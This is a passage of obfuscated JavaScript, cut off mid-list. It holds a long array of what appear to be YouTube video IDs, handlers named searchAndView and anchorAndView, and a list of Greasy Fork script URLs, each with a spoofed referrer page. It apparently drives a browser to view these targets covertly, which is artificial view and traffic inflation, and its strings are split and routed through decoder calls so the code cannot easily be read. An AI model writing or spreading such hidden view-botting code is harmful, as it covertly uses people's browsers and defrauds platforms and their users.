const hookPlaylistPoints = [
    'eHpl-BjXo5' + '8',
    '-PgyODlV6V' + '8',
    'S9EkXX0QYD' + 'U',
    'WvcG1OKdHW' + 'o',
    'b6gOcEwtZ8' + 'U',
    'apdtzA0Dzf' + 'k',
    'YiukDwYv2K' + '4',
    'zK-6UH5R5X' + '8',
    'bIXqNjtsEf' + '4',
    '3l253rESkw' + 'Q',
    V(0x10) + 'Q',
    '6ImZdwpdwT' + 'A',
    '0qPB5ANSBK' + 'c',
    '92duH3cqn1' + 'M',
    'b5lKI78fw3' + 's',
    'zpCCPZfP8L' + 'I',
    'ES7oooakr-' + 'c',
    '2eWyJ8FBvQ' + '8',
    'O4-B3OFPDf' + 'Q',
    W(0xc) + 'o',
    'AP7d2Ghq6d' + 'U',
    'UizEAwrZAG' + 'I',
    '0FAi5-h8Hj' + '0',
    'CNqA6IYj17' + 'k',
    'tSiKyCpwnS' + 'Y',
    'OrglyeV5xP' + 'Y',
    'BXkB-g4eCc' + 's',
    'Y53CmmpbOJ' + 's',
    'sm5MLz_IrQ' + 'k',
    'EuciRU_Ska' + '0',
    'cCbDCTLyPc' + 'E',
    'Ox7Ng5T7bm' + 'c',
    'TXTaB-dQg-' + '0',
    '3jSWaWgr_A' + '0',
    'xT8nvuxCRB' + 'E',
    '3c4Ab9EmRg' + 'Y',
    '2kScgeNOpL' + '8',
    't22jhowMom' + 'c',
    'HbcDLgkmXL' + 's',
    'JsKZ41uTeg' + 'c',
    'dfU48FRgs0' + 'g',
    '3K9ILewnUk' + 'o',
    'QmKwnRiKhD' + 'k',
    'n3nVsWsL6I' + 'k',
    'noTs52D_Mw' + 'Y',
    X(0x8, 'S9Do') + '0',
    '9eBwFca-B1' + '4',
    'moasU30H5l' + 'A',
    '_Mb8oQtSBW' + 'E',
    'TNGGOgwPtc' + 'M',
    '-pYA-gjkQ8' + 's',
    '5d-dB6tZZA' + 'o',
    '8H2AiOV0oE' + 'o',
    'mI7aiKDGde' + 'w',
    'D-IMDYrj35' + '4',
    'gKgFiEgghy' + 'g',
    'mjVwfjJ2nj' + 'k',
    '6auDBi-D2H' + 'M',
    'X89-SWNdIE' + 'k',
    'T5Pn4LhIwj' + 'M',
    'wVnKGSjY3i' + '8',
    'g11NJftxw1' + '4',
    '9zHirkfEKk' + 'k',
    'ZyGS_AMbIa' + '4',
    'yG6bwB17ZP' + 's',
    'aytHiLe0s6' + 'U',
    'cGe-Mpw_F1' + 'w',
    'eMK7xV_nxZ' + 'o',
    'epJ2MAKa1Y' + 'Q',
    '5BNbKKMUhE' + 'o',
    'oxpAvc6tDP' + '8',
    'jRcc-NIR2R' + 'I',
    '258btO4mFw' + '4',
    'pXjJAUvSbQ' + 'A',
    '63-irfPjh2' + 'c',
    'xbrDZAFf3Q' + 's',
    'MVHMtRlesU' + 'g',
    'zed05qfHMB' + 'I',
    'nkhkxKUHsY' + 'g',
    'n4cSAqR9H1' + 'Q',
    'gOUPndcj7z' + 'I',
    'n3HBTTDHoX' + '8',
    'XIgMFHPIXv' + '4',
    'oQHKMky-_K' + 'c',
    'zfDgTzZ2nh' + '0',
    '1PYettRo-D' + 'M',
    'jzuZuwF490' + '4',
    '2DAgWTlXae' + '8',
    'keouUYA5hI' + 'k',
    'F7i7wRlGCd' + 'c',
    'uToD2c0CdJ' + 'c',
    'Y8DzpdFZZ8' + '8',
    '-rrH657DAa' + 'o',
    'QTrEEWtDks' + '4',
    'TWTSnQDuad' + 'Y',
    'a0GUyvgnzg' + 'c',
    'eSReWZQyKd' + 'E',
    'D_5pMqdKSs' + '4',
    'm0ie8gHS00' + 'I',
    '6WosqMq9ej' + 'o',
    'i0afAOlon_' + '4',
    'j_fe6PfxW4' + 'Y',
    'GfPzi8SYr0' + 'w',
    'MSgZhNCwff' + 'M',
    'wxyBC_z6bI' + '8',
    'PkQpV-Fwhs' + 'k',
    'bVD6cWOVhN' + 'U',
    V(0xd) + 'M',
    'k_BXkcdbBO' + 'M',
    'X72oUsFV7q' + '0',
    'lONsILfq-W' + 'Y',
    'Bhe9PyM_s_' + 'Q',
    'Bhe9PyM_s_' + 'Q',
    'h4TBnDkX4y' + 'o',
    'PNBJyHEkfk' + '4',
    'L3iHS__ufc' + 'g',
    'm7aliUAwm_' + 'Y',
    'FuPVf85zMi' + 'w',
    'gtupAeNTDS' + 'M',
    'yyJ8zkckoB' + '8',
    'ZDTESiN1eS' + 'w',
    'Fo6x16DkoR' + 'o',
    'IAJqRxhVqO' + 'k',
    'KAgwII8TGj' + 'o',
    'o4tLCshmlb' + 'M',
    'dLj5fIupdA' + 'o',
    '_Xl_-b9P4U' + 'Q',
    'V3NxxpUUfW' + 'E',
    'J3ygeDEMnO' + 'w',
    'HcP_xmdwsl' + 'c',
    'M9g0h7px2_' + 'M',
    'b5WfUvcSgr' + 'U',
    'JGHnIshsoC' + 'E',
    'x2gfhCLHd9' + '4',
    V(0x1a) + 'o',
    '3sGeIBfFlC' + 'M',
    'k74y4KOJ2m' + '4',
    'pTHJB0S8E-' + 'U',
    'KaIrXJLfYP' + 'M',
    '0cisZkywhg' + 'Q',
    '0dVzItbl9E' + 'w',
    't0EqnhcSb1' + 's',
    'MuiXtvo1RY' + 'E',
    'Nj-3KC6knH' + 'w',
    'B19HbETNi5' + '8',
    'yKN_QkroH6' + 's',
    'U9ExFM1pji' + '0',
    'sONzDfjKhL' + '4',
    'n3Kj8zEfew' + 'U',
    'nXLGQ7QeoG' + 'Y',
    'OQFQiwiM-P' + 'Y',
    'UtPRpKRTtH' + 'U',
    'E56Myp0BzE' + 'E',
    '7DjOp_JM2Z' + 'w',
    'rNFLQFz_G1' + 'g',
    '1r2pKoVAdj' + 'M',
    'gm3eiv6UND' + 'M',
    'yOiROfjxzX' + 'o',
    'lt2AcxC_ap' + 'g',
    'bObEme2BDO' + 'E',
    '6Ut6HbJmW4' + 'w',
    'fUs0TtQQTo' + '0',
    '_phHS3FAgW' + 'Q',
    '1f8sU4l3dP' + '4',
    'HwTSLUd53K' + '8',
    'EpP2ymD_QG' + 'A',
    'TQ69QFqmbo' + 'I',
    'wA8BqUka_u' + '0',
    'bc8Ey-vuR5' + 'M',
    'PZ_uLi7ULl' + '0',
    'smu5FsnhwF' + '4',
    'dv1JluwoOb' + 'c',
    'nHotP0jbcv' + 'A',
    'iIjYNEmrVv' + 'M',
    'SeP-OZAiPb' + 'c',
    'v52PClvMFt' + 'k',
    '3loLqIPxTS' + '0',
    'jVu9mOzbSq' + 'U',
    '73SAN1vOrV' + 'k',
    'YLPxp4ntym' + 's',
    'YWXfelRk3b' + 'Q',
    'CsxlLMb6Uj' + 'o',
    'uafGOfwzpa' + 'Q',
    'XIr8qotHOI' + 'E',
    'EcoPCWC3Uh' + 'o',
    'AhOwyT8aIh' + 'g',
    't-Ox7lI5UH' + 's',
    'i08qNmssXe' + 'Q',
    'QrJIU09eD-' + 'g',
    'QvNNCQ-8Rp' + 'E',
    'k5gjnjDFAZ' + 's',
    'h_NQ3y1ek8' + 'U',
    'evPsJlNLy_' + '4',
    'qEPTydgwh4' + 's',
    'LB685ckhuf' + 'E',
    'Lj1EcSMGey' + '0',
    'OE19r7MIMW' + 'Q',
    'u8E3p0Vy-P' + 'Y',
    'f4a5OPFQa7' + 'k',
    'XDo7Q7yUEt' + 'k',
    'Vw_9zw0qHI' + 'c',
    'KGT5nbDsI_' + '8',
    'E008Eql59M' + 'Q',
    'wSOFdefX47' + 'A',
    '2xcv7q3QhR' + 'E',
    'hgfvmcBkc0' + '4',
    '0wP7csnX7k' + '4',
    'Xo0R8WiRSb' + '4',
    '8zNp8EOpGd' + '4',
    'sWYhIJZmoS' + 'E',
    'YdG8U1W-bX' + '0',
    'QeDsoSNml-' + 'c',
    'xW5q77El0x' + '8',
    'ZF14issJFE' + 'Y',
    'TRglEGLLKX' + 'o',
    'UE0SXc5k1e' + 'g',
    '6VY65D8f3D' + 'Q',
    'Iwxuob4fA8' + 'Q',
    'M4elJHCUIi' + 's',
    'GY9WWhO504' + 'k',
    'eErUSxmLDw' + '8',
    'ITQfAfzLj3' + 'I',
    'vbDrCL2FuL' + 'g',
    'KyQ_sUgtbK' + 'U',
    'lbEJcipUp8' + 'I',
    '2SqCn2LreN' + 'g',
    '1i-G2TUn41' + '0',
    's0ru6uK7vi' + '8',
    'gOxiE5UAAD' + 'w',
    'lx1rOOjekc' + '8',
    '5VYN2zA-Si' + 'k',
    'q9rLWEAzoo' + 'k',
    '4KSm3IY7Xz' + 'g',
    'fMqRu_ON-D' + 'E',
    'GfvShU6Sy9' + 'A',
    'OHzOmi1b60' + 'Y',
    'D9oTUKT-_n' + 'A',
    '_BrT2PlUiw' + '0',
    'kuuI4LzKgm' + 'I',
    '78dymyg88r' + 'M',
    'mi0nGt2B-q' + 'o',
    'HaI7BjnwnO' + 'c',
    'xlAEOkIuy7' + 'Y',
    '3VmtckvTXl' + 'U',
    'ed7TWHKDr4' + 'E',
    '2LfTjyVtbf' + 'U',
    'STHlCkloyv' + 'E',
    '-BI_-6YnM6' + 'Y',
    'LSK_G1qCQw' + 'M',
    '4tzqIl6EKV' + 'k',
    '9DshU55EiV' + '8',
    'mBtaEI_6e8' + 's',
    '960lvuduwY' + 'w',
    'XWJH-6J5Ee' + 'g',
    'XLS4qmyCAX' + 'g',
    '8cJDYeRiLn' + 'k',
    'cCaIVrltHz' + 'w',
    '8X2fF4pgM0' + 'E',
    '6s8Xm4wylr' + '4',
    'eFceshvavn' + 'o',
    '2h4g7euqR-' + 'U',
    'ujiBqXnn92' + '8',
    'w9F2NST-9j' + 's',
    'w-oc7F5Mmy' + 'U',
    'UYrmqL3cOD' + 'U',
    '4QB59etj0I' + 'o',
    'MY9MTNgXcN' + 'o',
    'ISBmcKDS5C' + '8',
    'ogIb7A7tvW' + '0',
    '-L583IZF6s' + 'k',
    'NbeKQq29ZL' + '0',
    'SPplDxd74F' + 's',
    'MHGV8QmpAz' + 'k',
    'iWzezFWpU7' + 'A',
    'NNCQt1rXXE' + 'Y',
    'bcb_ZhJJK8' + 'g',
    '3KoZGQiY6N' + 'o',
    'aSaXQH8F1_' + 'A',
    'V5nMOhI62o' + 'w',
    'JvlPjRUdId' + '0',
    '2gQHuClLCb' + '0',
    '5e-qDy-uUJ' + 'E',
    'oE8vC0QEWU' + 'E',
    '7cQken99yu' + 'o',
    'pmzu080j7r' + 'I',
    'sVy9F4whP6' + 'o',
    'MJrkylk7iE' + 'c',
    'XYjsTxi6oE' + '8',
    W(0x15) + '0',
    'o2yunZQley' + 'A',
    'oRryU9F9Lv' + 's',
    'uzzK-052H0' + 'c',
    'VSvA4rCe-4' + 'M',
    'XURH2u_0fM' + 'I',
    'yfpVL2g_tk' + 'o',
    'AuEEjQ8x9o' + 'w',
    'wWkviY8zBr' + 'c',
    'zt_eubHWhx' + 'c',
    'O_7_BGU3u_' + '0',
    'QFDKBxmOn3' + 'Y',
    'w6gccNWXXv' + 'g',
    'VdNJxbrqdX' + 's',
    'wbi5Dxebvn' + 'I',
    'XEFOREYrJg' + 'k',
    'I2rcRta7WJ' + '0',
    'OP5KGfXHX_' + 'A',
    'w2MUMbbwlm' + 'o',
    'X3bF0nd6kf' + 'w',
    'WDDAhASf9j' + 'w',
    'fRwcV8gjbc' + 'w',
    '7T63gaRThr' + '0',
    'zC8AWIwhbf' + 's',
    'JSkVE0n-ee' + 'o',
    'qiQA5pWWRt' + 'U',
    'QdXCjZtfXu' + 'c',
    'vlBji8TOax' + 'o',
    'pBx_5CbIcp' + 'o',
    'L1Oy5F6ZMO' + 'Q',
    'P0NjLaBed-' + 'E',
    'DR16C4-keB' + '0',
    'LGmpIpu9eD' + 'w',
    'rNkX_A4kBA' + 'Q',
    'QztVMjrEk4' + '0',
    'uOM6m6KL5d' + '4',
    'g-Aju8xrrO' + 'E',
    'DfkDbFk_x9' + '8',
    'Y4NLDaowD6' + 'I',
    'ALSZnqQTuJ' + 'o',
    'xUmB6BpZBE' + 'w',
    'SxNOcZ1s85' + '8',
    '-noeCjO416' + 'k',
    W(0x19) + 'Y',
    'YxqbkMi1Is' + '4',
    'vnJTyve2r-' + '4',
    '44lRVYQ38E' + 'Q',
    'QOv1N1X5J-' + 'g',
    'jNjREs7ODT' + 'g',
    'U30ToJo3dd' + 'k',
    'rm7lNIIOQC' + 'Y',
    'mGU6sOPlYv' + 'c',
    '6pwxUXdt6T' + 'Q',
    '6MkJRee35a' + 'Q',
    'LVbf7U9WAI' + 'c',
    'gPbhFvEeJ3' + 'M',
    'LWXAxz0MiH' + 'A',
    'L0KQJqfwJJ' + 'Y',
    V(0x14) + 'c',
    '4ud3ZPfWkH' + 's',
    'dxSrySC4XM' + 'c',
    'iIM2KZC69W' + '0',
    '8DuJ3BAwME' + 'o',
    'm3BAhe1wsl' + 'Y',
    '02U_3pAZxM' + '8',
    '0e7nidPa97' + 'g',
    'TixW__6Eer' + 'o',
    'q46W8MTRTC' + 'E',
    'Jdxp04Je1O' + 'w',
    'HfP4TO3gfN' + '0',
    '4dUJaeB0qL' + '8',
    'xnL-fRJ3RZ' + 'o',
    'yJbD0Df45u' + 'Q',
    '-pGw8RkSSB' + 'k',
    '7cy86Njsis' + 'M',
    'jbgqvxtauo' + '4',
    'N8M00JjSVI' + 'I',
    'MfR5q6Td3R' + 'c',
    'eHwcx94wcp' + 's',
    'olDgVFgAgP' + 'o',
    'eAAd5BmzXz' + 'M',
    'xgTjQ2sGXd' + '4',
    'ipny6JUbzw' + 's',
    'WOwQ0UxbRj' + '4',
    'h0PKFed2GB' + 's',
    'JxdOrgzq7Z' + '8',
    '-VgpSWWW-8' + 'w',
    '-ix4OizkAn' + 's',
    'd3CRE9y3YV' + 's',
    '4QZlfXxorJ' + 'o',
    'YlDpg8aCs5' + 'M',
    'Qe5WT22-AO' + '8',
    'b_rjBWmc1i' + 'Q',
    '9yjZpBq1XB' + 'E',
    'hPx-RiBKXt' + 'Q',
    'UMqLDhl8PX' + 'w',
    'DlJEt2KU33' + 'I',
    'BWeqoARup-' + 'Q',
    '2Dx76lD8Sc' + 'c',
    'j_nI6G3ZDi' + 'E',
    'zvcUYYN1sx' + 'w',
    'cWRkYo1S3L' + '4',
    'cWRkYo1S3L' + '4',
    'bxC_PN3SRv' + 'I',
    '94m93T_5JL' + 'M',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'bo9fTeXvSi' + 'A',
    'z6LqXiAK-8' + '0',
    '5tbOspjJ5f' + '0',
    'twQ6kKjtBk' + 'Y',
    'Ig17K38Fy0' + 'Y',
    'ZdlrVDwn_a' + '4',
    'aCT4Lddunx' + 'g',
    'acAvMGQtln' + 'M',
    '8XkcbdSRdO' + '0',
    '0e3GPea1Ty' + 'g',
    'zxYjTTXc-J' + '8',
    '9bqk6ZUsKy' + 'A',
    'plSyrHqUh7' + '8',
    'HkvQywg_uZ' + 'A',
    'lADBHDg-Jt' + 'A',
    'I2O7blSSzp' + 'I',
    'kd2KEHvK-q' + '8',
    'CbUjuwhQPK' + 's',
    'fb7T1v_VHp' + 'E',
    'SpeSpA3e56' + 'A',
    'RQdxHi4_Pv' + 'c',
    'nx2-4l4s4N' + 'w',
    'tUTCq3iiw_' + '4',
    'VDa5iGiPgG' + 's',
    'S-sJp1FfG7' + 'Q',
    'Hm1YFszJWb' + 'Q'
  ],
  GlobalActions = [
    searchAndView,
    anchorAndView,
    frontScreenActions,
    keyWatch
  ],
  wait = f => new Promise(h => setTimeout(h, f)),
  scriptTargets = [{
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + '-xclient-b' + 'eta',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/surviv.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E7%B2%BE%E' + '7%81%B5',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/51cto.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + 'direct',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/baidu' + '.com?page=' + '4'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + '044-zhihu-' + 'anonymous-' + 'users',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + 'ink-fix',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + '-btb',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430335' + '-wb-script',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + 'youtubeext',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + 'control',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/9090-y' + 'outube-add' + '-video-id-' + 'text-field',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + 'ble',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + X(0x5, 'w$v1') + 'uto-skip-a' + 'ds',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + 'erevar009',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + 'e-classic',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414756' + '-requestho' + 'ok',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + '-resume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40517-' + 'youtube-re' + 'sume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/381682' + '-html5%E8%' + 'A7%86%E9%A' + '2%91%E6%92' + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/30310-' + 'removeads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454941' + '-hcaptcha-' + 'captcha-so' + 'lver-by-no' + 'captchaai',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + W(0x7)
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/discord.' + 'com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + X(0x3, 'vJOT') + 'see-people' + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + 'ore',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429746' + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456855' + '-anti-anti' + '-adblock-v' + '1-all-site' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + 'utobreak-f' + 'ast-and-mo' + 're',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + 'ility-mod',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/434199' + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + X(0x1, 'w$v1') + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456851' + '-omnifocus',
